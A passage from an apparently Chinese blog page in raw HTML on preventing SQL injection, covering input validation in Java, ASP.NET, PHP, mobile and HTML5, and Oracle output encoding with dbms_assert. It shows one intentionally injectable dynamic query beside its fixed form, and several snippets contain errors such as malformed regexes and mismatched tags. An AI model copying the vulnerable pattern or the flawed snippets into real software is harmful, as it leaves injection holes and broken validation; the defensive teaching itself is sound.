&lt;span class=&#34;token class-name&#34;&gt;UIComponent&lt;/span&gt; uIComponent&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Object&lt;/span&gt; value&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ValidatorException&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//获取用户名并转换为一个字符串&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//建立正则表达式&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;Pattern&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Pattern&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;compile &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;^[a-zA-z] {8, 12}$&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//匹配用户名&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;Matcher&lt;/span&gt; m &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;matcher&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;matchFound&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;FacesMessage&lt;/span&gt; message &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;FacesMessage&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
message&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setDetail&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Not valid - it must be 8-12 letter only&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
message&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setSummary&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Username not valid&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
message&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setseverity&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;FacesMessage&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;SEVERITY_ERROR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ValidatorException&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;message&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;需要将下列内容添加到faces-config.xml文件中以便启用上述验证器&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-markup&#34; data-language=&#34;markup&#34;&gt;&lt;code class=&#34;language-markup&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;validator&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;validator-id&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;namespace.UsernameValidator&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;validator-id&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;validator-class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;namespace.package.UsernameValidator&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;validatorclass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;validator&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接下来可以在相关的JSP文件中引用在faces-config.xml文件中添加的内容&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-jsp&#34; data-language=&#34;jsp&#34;&gt;&lt;code class=&#34;language-jsp&#34;&gt;&amp;lt;h:inputText value=&#34;username&#34; id=&#34;username&#34;
required=&#34;true&#34;&amp;gt;&amp;lt;f:validator
validatorId=&#34;namespace.UsernameValidator&#34; /&amp;gt;
&amp;lt;/h:inputText&amp;gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在Java中实现输入验证时，还有一种很有用的资源OWASP ESAPI(Enterprise Security API)，包括org.owasp.esapi.reference.DefaultValidator输入验证类的实现，可以直接使用它，也可以将它作为自定义输入验证引擎的参考实现。&lt;/p&gt;
&lt;h4 id=&#34;NET中的输入验证&#34;&gt;&lt;a href=&#34;#NET中的输入验证&#34; class=&#34;headerlink&#34; title=&#34;.NET中的输入验证&#34;&gt;&lt;/a&gt;.NET中的输入验证&lt;/h4&gt;&lt;p&gt;ASP.NET提供了&lt;code&gt;Regular-Expression Validator&lt;/code&gt;控件和&lt;code&gt;Custom Validator&lt;/code&gt;控件，执行客户端验证。&lt;/p&gt;
&lt;p&gt;下列代码是使用&lt;code&gt;RegularExpressionValidator&lt;/code&gt;验证用户名的例子，用户名中只能包含字母(大写和小写)并且总长度必须介于8到12个字符之间。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-asp&#34; data-language=&#34;asp&#34;&gt;&lt;code class=&#34;language-asp&#34;&gt;&amp;amp;ltasp:textbox id=&#34;userName&#34; runat=&#34;server&#34;/&amp;gt;
&amp;amp;ltasp:RegularExpressionValidator id=&#34;usernameRegEx&#34; runat=&#34;server&#34; ControlToValidate=&#34;userName&#34;
ErrorMessage=&#34;Username must contain 8 - 12 letters only.&#34;
ValidationExpression=&#34;^[a-zA-Z]{8,12}$&#34; /&amp;gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接下来的代码片段是使用&lt;code&gt;CustomValidator&lt;/code&gt;验证口令是否为正确格式的例子。创建两个用户定义函数&lt;code&gt;PwdValidate&lt;/code&gt;位于服务器上，负责对口令值进行验证；&lt;code&gt;ClientPwdValidate&lt;/code&gt;位于客户端的JavaScript或VBScript中，负责对用户浏览器上的口令值进行验证。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-asp&#34; data-language=&#34;asp&#34;&gt;&lt;code class=&#34;language-asp&#34;&gt;&amp;amp;ltasp:textbox id= &#34;txt Pas sword&#34; runat=&#34;server&#34;/&amp;gt;
&amp;amp;ltasp:CustomValidator runat=&#34;server&#34; ControlToValidate=&#34;txtPassword&#34;
ClientValidationFunction=&#34;ClientPwdValidate&#34;
ErrorMessage=&#34;Password does not meet requirements.&#34;
OnServerValidate=&#34;PwdValidate&#34; /&amp;gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;PHP中的输入验证&#34;&gt;&lt;a href=&#34;#PHP中的输入验证&#34; class=&#34;headerlink&#34; title=&#34;PHP中的输入验证&#34;&gt;&lt;/a&gt;PHP中的输入验证&lt;/h4&gt;&lt;p&gt;PHP不直接依赖于表示层，因而PHP中的输入验证支持属于所使用的框架。许多PHP应用程序直接在代码中实现输入验证。&lt;/p&gt;
&lt;p&gt;可以使用PHP中的很多函数作为构造输入验证的基本构造块，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;preg_match(regex,matchstring):使用正则表达式regex对 matchstring执行正则表达式匹配。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;is_&amp;lt;type＞(input):检查输入是否＜type＞，例如 is_numeric()。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;strlen(input)：检查输入的长度。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用preg_match验证表单参数：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;username&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/^[a-zA-Z] {8, 12}$/D&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//处理验证失败的情况&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;在移动应用程序中检验输入&#34;&gt;&lt;a href=&#34;#在移动应用程序中检验输入&#34; class=&#34;headerlink&#34; title=&#34;在移动应用程序中检验输入&#34;&gt;&lt;/a&gt;在移动应用程序中检验输入&lt;/h4&gt;&lt;p&gt;移动应用程序中的数据既可以存储在远程服务器上，也可以存储在本地的应用中。对于这两种情况都需要在本地检验输入。对于远程存储的数据，需要在远程服务器端对输入进行检查。&lt;/p&gt;
&lt;p&gt;可以采用两种方式对输入搜索(in-device input)的输入数据进行检验。可以使用一种仅支持我们所期望数据类型的输入域类型(field type)，比如使用仅支持输入数字的输入域。另外也可以订阅输入域的change事件，当接收到无效输入时由事件处理程序进行处理。Android支持输入过滤器(input filter)的概念，它可以将一个或多个InputFilter的实现自动地应用于数据，并且可以拒绝无效的输入。&lt;/p&gt;
&lt;h4 id=&#34;在HTML5中检验输入&#34;&gt;&lt;a href=&#34;#在HTML5中检验输入&#34; class=&#34;headerlink&#34; title=&#34;在HTML5中检验输入&#34;&gt;&lt;/a&gt;在HTML5中检验输入&lt;/h4&gt;&lt;p&gt;在开发HTML5应用程序时，数据可以存储在Web浏览器的本地存储中，也可以存储在承载HTML5Web应用程序的远程Web服务器上。对于存储在浏览器本地存储中的数据，可以使用JavaScript检验数据，或者使用HTML5提供的新类型的＜input＞输入域进行检验。这些＜input＞输入域支持required属性，该属性指示浏览器检查在该输入域中必须具有输入值。此外，还支持pattern属性，允许开发人员设置一个正则表达式，输入的数据必须满足该正则表达式的约束：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-markup&#34; data-language=&#34;markup&#34;&gt;&lt;code class=&#34;language-markup&#34;&gt;&amp;lt;input type=&#34;text&#34; required= &#34;required&#34; pattern:&#34;^[0-9] {4}...&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果客户端应用程序正把数据发送回服务器端的应用程序， 那么服务器端代码必须总是重新检验它从HTML5应用程序中接收到的输入数据。&lt;/p&gt;
&lt;h3 id=&#34;编码输出&#34;&gt;&lt;a href=&#34;#编码输出&#34; class=&#34;headerlink&#34; title=&#34;编码输出&#34;&gt;&lt;/a&gt;编码输出&lt;/h3&gt;&lt;h4 id=&#34;编码发送给数据库的内容&#34;&gt;&lt;a href=&#34;#编码发送给数据库的内容&#34; class=&#34;headerlink&#34; title=&#34;编码发送给数据库的内容&#34;&gt;&lt;/a&gt;编码发送给数据库的内容&lt;/h4&gt;&lt;p&gt;有时白名单过滤并不能完全，可能还会动态拼接产生SQL注入，对于无法或不适合使用参数化语句的情况，有必要对发送给数据库的数据进行编码（或引用）&lt;/p&gt;
&lt;h5 id=&#34;针对Oracle的编码&#34;&gt;&lt;a href=&#34;#针对Oracle的编码&#34; class=&#34;headerlink&#34; title=&#34;针对Oracle的编码&#34;&gt;&lt;/a&gt;针对Oracle的编码&lt;/h5&gt;&lt;p&gt;Oracle使用单引号作为字符串的结束符，因而有必要对包含在字符串（动态SQL中将包含该字符串）中的单引号进行编码。&lt;/p&gt;
&lt;p&gt;在Oracle中，可以通过使用两个单引号替换单个单引号的方法来实现编码目的。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#39;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;由于在PL/SQL中需要为单引号添加引用符（因为它是字符串结束符），因而在PL/SQL中需要使用两个单引号来替换单个单引号。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &#39;&#39;&#39;&lt;span class=&#34;token char&#34;&gt;&#39;,&#39;&lt;/span&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;；
sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;CHR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;39&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;CHR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;39&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;CHR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;39&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;对LIKE字句的通配符转义&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a%&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 易受攻击。返回所有以&#34;a&#39;字符开头的用户&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a\%&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ESCAPE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;\&#39;
-- 不容易受攻击，返回用户&#39;&lt;/span&gt;a&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,如果存在一个这样的用户的话
&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 使用ESCAPE子句时，可以指定任何单个字符作为转义字符&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;“q”引用，采用 q’[QUOTE CHAR]string[QUOTE CHAR]’格式。引用字符(quote character)可以是任何未出现在字符串中的单个字符&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;q&lt;span class=&#34;token string&#34;&gt;&#39;(5%)&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果无法使用参数化查询，就应该使用dbms_assert包来执行输入验证。dbms_assert提供了7个不同的函数(ENQUOTE_LITERAL、ENQUOTE_ NAME、NOOP、QUALIFIED_SQL_NAME、 SCHEMA_NAME、SIMPLE_SQL_NAME和SQL_OBJECT_NAME)来验证不同类型的输入。&lt;/p&gt;
&lt;p&gt;一个未使用dbms_assert的非安全查询(FIELD、OWNER和TABLE中存在SQL注入)：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;execute&lt;/span&gt; immediate &lt;span class=&#34;token string&#34;&gt;&#39;select&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; FIELD &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;from&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; OWNER &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;.&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下面是相同的查询，不过使用了dbms_assert进行输入验证：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;execute&lt;/span&gt; immediate &lt;span class=&#34;token string&#34;&gt;&#39;select &#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbms_assert&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SIMPLE_SQL_NAME&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;FIELD&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;from&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbms_assert&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ENQUOTE_NAME
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbms_assert&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SCHEMA_NAME&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;OWNER&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;FALSE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;.&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbms_assert&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;QUALIFIED_SQL_NAME&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;dbms assert 函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;函   数&lt;/th&gt;
&lt;th&gt;描   述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;DBMS_ASSERT.SCHEMA_NAME&lt;/td&gt;
&lt;td&gt;该函数检查传递的字符串是否为数据库中存在的对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;DBMS_ASSERT.SIMPLE_SQL_NAME&lt;/td&gt;
&lt;td&gt;该函数检查SQL元素中是否只包含A-Z、a-z、0-9、$、 #和_这样的字符。如果使用双引号来引用参数，那么允许使用除双引号之外的所有字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;DBMS_ASSERT.SQL_OBJECT_NAME&lt;/td&gt;
&lt;td&gt;该函数检查传递的字符串是否为数据库中存在的对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;DBMS_ASSERT.QUALIFIED_SQL_NAME&lt;/td&gt;
&lt;td&gt;该函数与SIMPLE_SQL_NAME非常类似，不过它还允许数据库连接&lt;/td&gt;
&lt;/tr&gt;
